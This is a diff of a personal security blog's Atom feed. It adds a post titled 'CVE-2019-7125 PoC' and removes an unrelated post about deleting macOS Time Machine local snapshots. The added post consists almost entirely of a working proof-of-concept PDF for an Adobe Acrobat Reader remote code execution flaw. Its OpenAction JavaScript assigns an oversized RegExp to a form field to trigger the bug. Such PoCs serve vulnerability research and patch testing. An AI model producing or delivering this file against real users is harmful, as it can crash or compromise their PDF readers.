@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://o0xmuhe.me/"/>
-  <updated>2019-04-06T13:54:22.054Z</updated>
+  <updated>2019-04-12T03:11:12.843Z</updated>
   <id>http://o0xmuhe.me/</id>
   
   <author>
@@ -14,6 +14,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2019-7125 PoC</title>
+    <link href="http://o0xmuhe.me/2019/04/12/CVE-2019-7125-PoC/"/>
+    <id>http://o0xmuhe.me/2019/04/12/CVE-2019-7125-PoC/</id>
+    <published>2019-04-12T03:09:58.000Z</published>
+    <updated>2019-04-12T03:11:12.843Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="1-day-CVE-2019-7125"><a href="#1-day-CVE-2019-7125" class="headerlink" title="[1+day] CVE-2019-7125"></a>[1+day] CVE-2019-7125</h1><h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>From Talos :<br><code>Adobe Acrobat Reader DC text field value remote code execution vulnerability — redux</code></p>
+<a id="more"></a>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.5</span><br><span class="line"></span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">/Kids</span><br><span class="line">  [&lt;&lt;</span><br><span class="line">  /Annots</span><br><span class="line">    [&lt;&lt;</span><br><span class="line">    /Subtype /Text</span><br><span class="line">    /Rect[0 0 0 0]</span><br><span class="line">    /Subj (Hello World!)</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &lt;&lt;</span><br><span class="line">    /Subtype /Text</span><br><span class="line">    /Rect[0 0 0 0]</span><br><span class="line">    /Subj (Hello zzzWorld!)</span><br><span class="line">    &gt;&gt;]</span><br><span class="line">  /Parent 1 0 R</span><br><span class="line">  /Contents[3 0 R]</span><br><span class="line">  &gt;&gt;]</span><br><span class="line">  /Resources&lt;&lt;&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">%endobj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3 0 obj&lt;&lt;&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT/F1 105 Tf 0 400 Td(Adobe Reader)Tj ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">/Root</span><br><span class="line">  &lt;&lt;</span><br><span class="line">  /AcroForm</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Fields</span><br><span class="line">      [</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        /Rect[10 10 10 10]</span><br><span class="line">        /Subtype/Widget</span><br><span class="line">        /T(mytext)</span><br><span class="line">        /V(this is a text)</span><br><span class="line">        /FT/Tx</span><br><span class="line">      &gt;&gt;</span><br><span class="line">      ]</span><br><span class="line">  &gt;&gt;</span><br><span class="line">  /OpenAction</span><br><span class="line">    &lt;&lt;</span><br><span class="line">    /S /JavaScript</span><br><span class="line">    /JS(</span><br><span class="line">4444var r = new RegExp(Array(32770).join(String.fromCharCode(24)));</span><br><span class="line">4444this.getField(&apos;mytext&apos;)[&apos;value&apos;] = r;</span><br><span class="line">44)</span><br><span class="line">    &gt;&gt;</span><br><span class="line">  /Pages 1 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0774" target="_blank" rel="noopener">TALOS-2019-0774</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;1-day-CVE-2019-7125&quot;&gt;&lt;a href=&quot;#1-day-CVE-2019-7125&quot; class=&quot;headerlink&quot; title=&quot;[1+day] CVE-2019-7125&quot;&gt;&lt;/a&gt;[1+day] CVE-2019-7125&lt;/h1&gt;&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;p&gt;From Talos :&lt;br&gt;&lt;code&gt;Adobe Acrobat Reader DC text field value remote code execution vulnerability — redux&lt;/code&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Adobe Reader" scheme="http://o0xmuhe.me/tags/Adobe-Reader/"/>
+    
+      <category term="PoC" scheme="http://o0xmuhe.me/tags/PoC/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2018-4990 analysis</title>
@@ -833,41 +859,6 @@
       <category term="debug" scheme="http://o0xmuhe.me/tags/debug/"/>
     
       <category term="mips" scheme="http://o0xmuhe.me/tags/mips/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>拯救macOS High sierra的硬盘空间</title>
-    <link href="http://o0xmuhe.me/2018/03/14/%E6%8B%AF%E6%95%91macOS-High-sierra%E7%9A%84%E7%A1%AC%E7%9B%98%E7%A9%BA%E9%97%B4/"/>
-    <id>http://o0xmuhe.me/2018/03/14/拯救macOS-High-sierra的硬盘空间/</id>
-    <published>2018-03-14T09:03:06.000Z</published>
-    <updated>2019-01-18T02:12:57.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 : 起因"></a>0x00 : 起因</h4><p>Mac一直开着time machine备份数据，一直没出啥问题。<br>直到今天在工作的时候，原本clone的一个虚拟机有问题，我就删了，重新克隆。(没有快照真的尴尬了)</p>
-<a id="more"></a>
-<p>结果发现克隆不了，提示我硬盘空间不足。 :(<br>我看了下本机的硬盘，明明还有120g+呢，怎么会不足呢。</p>
-<h4 id="0x01-问题所在"><a href="#0x01-问题所在" class="headerlink" title="0x01 : 问题所在"></a>0x01 : 问题所在</h4><p>我使用了clean my mac各种搞事、清理空间，磁盘剩余空间到了200g。。但是我克隆还是失败 :(</p>
-<p>于是打开磁盘工具查看，发现有150g空间的空间是可以清除的，就很好奇哪来的这么大的空间…</p>
-<p>看了Apple官网，说是啥文件可以存iCloud，然后下载的时候用，就可以省下来一部分空间，可是我想了想，肯定不是这个啊，我iCloud一共才50g，而且才用了一半，这150g肯定不对。</p>
-<p>后来在<a href="https://www.v2ex.com/t/389533" target="_blank" rel="noopener">v2ex</a>看到了正解。</p>
-<p>这是升级了10.13后的time machine搞的事，他有自动本地备份。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当 TM 打开后，如果备份介质不可用，那么 TM 不会停止工作，它依然会监控系统的运行，并建立本地快照，以达成 TM 的备份功能，比如如果你在此时不小心删除了一个文件，那么依然可以从 TM 中将它恢复，这是一个不错的功能。一旦你的备份介质可用，它会自动将快照移到（不是备份，是移动）备份介质中，以释放本地空间；而且它会依照当前系统分区的使用情况来确认自己建立本地快照的行为，简单说就是当本地空闲空间过少时，它会酌情删除旧的本地快照。</span><br></pre></td></tr></table></figure>
-<p>大概就是这样的情况。</p>
-<h4 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 : 解决"></a>0x02 : 解决</h4><h6 id="1-关闭本地备份"><a href="#1-关闭本地备份" class="headerlink" title="1. 关闭本地备份"></a>1. 关闭本地备份</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tmutil disablelocal</span><br></pre></td></tr></table></figure>
-<p>但是我发现这个命令已经没了，好像是被移除了。</p>
-<h6 id="2-删除本地备份"><a href="#2-删除本地备份" class="headerlink" title="2. 删除本地备份"></a>2. 删除本地备份</h6><p>只能先用<code>tmutil listlocalsnapshots [mount]</code>找本地备份，然后使用<code>tmutil deletelocalsnapshots YYYY-MM-DD-HHMMSS</code> 来删除。<br>下面是我的测试…</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:12] C:64</span></span><br><span class="line">$ tmutil listlocalsnapshots</span><br><span class="line">Usage: tmutil listlocalsnapshots &lt;mount_point&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:25] C:64</span></span><br><span class="line">$ tmutil listlocalsnapshots /</span><br><span class="line">com.apple.TimeMachine.2018-03-09-011841</span><br><span class="line">com.apple.TimeMachine.2018-03-13-181325</span><br><span class="line">com.apple.TimeMachine.2018-03-13-191609</span><br><span class="line">com.apple.TimeMachine.2018-03-13-202018</span><br><span class="line">com.apple.TimeMachine.2018-03-13-211538</span><br><span class="line">com.apple.TimeMachine.2018-03-13-221327</span><br><span class="line">com.apple.TimeMachine.2018-03-14-001309</span><br><span class="line">com.apple.TimeMachine.2018-03-14-012200</span><br><span class="line">com.apple.TimeMachine.2018-03-14-030328</span><br><span class="line">com.apple.TimeMachine.2018-03-14-050253</span><br><span class="line">com.apple.TimeMachine.2018-03-14-064523</span><br><span class="line">com.apple.TimeMachine.2018-03-14-104506</span><br><span class="line">com.apple.TimeMachine.2018-03-14-115132</span><br><span class="line">com.apple.TimeMachine.2018-03-14-142419</span><br><span class="line">com.apple.TimeMachine.2018-03-14-152240</span><br><span class="line">com.apple.TimeMachine.2018-03-14-162236</span><br><span class="line">com.apple.TimeMachine.2018-03-14-163225</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:32]</span></span><br><span class="line">$ tmutil deletelocalsnapshots 2018-03-09-011841</span><br><span class="line">Deleted <span class="built_in">local</span> snapshot <span class="string">'2018-03-09-011841'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:01:12]</span></span><br><span class="line">$ tmutil deletelocalsnapshots 2018-03-13-181325</span><br><span class="line">Deleted <span class="built_in">local</span> snapshot <span class="string">'2018-03-13-181325'</span></span><br></pre></td></tr></table></figure>
-<p>写了个脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'tmutil listlocalsnapshots /'</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">out, err = process.communicate()</span><br><span class="line">out = out.split(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">local_snapshots = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> out:</span><br><span class="line">    local_snapshots.append(item.split(<span class="string">'.'</span>)[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> local_snapshots:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = <span class="string">'tmutil deletelocalsnapshots &#123;0&#125;'</span>.format(item)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[*] Deleting localsnapshot : &#123;0&#125;'</span>.format(item))</span><br><span class="line">        process = subprocess.Popen(cmd, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        out, err = process.communicate()</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[*] Localsanpshot &#123;0&#125; deleted'</span>.format(item))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[!] Error on &#123;0&#125; , &#123;1&#125;'</span>.format(item, e))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'[*] All done, have a nice day :)'</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 : 参考"></a>0x03 : 参考</h4><p><a href="https://www.v2ex.com/t/389533" target="_blank" rel="noopener">10.13 升级后，多出了很大一块隐藏空间，不能用也删除不了？– v2ex</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 起因&quot;&gt;&lt;/a&gt;0x00 : 起因&lt;/h4&gt;&lt;p&gt;Mac一直开着time machine备份数据，一直没出啥问题。&lt;br&gt;直到今天在工作的时候，原本clone的一个虚拟机有问题，我就删了，重新克隆。(没有快照真的尴尬了)&lt;/p&gt;
-    
-    </summary>
-    
     
   </entry>
   
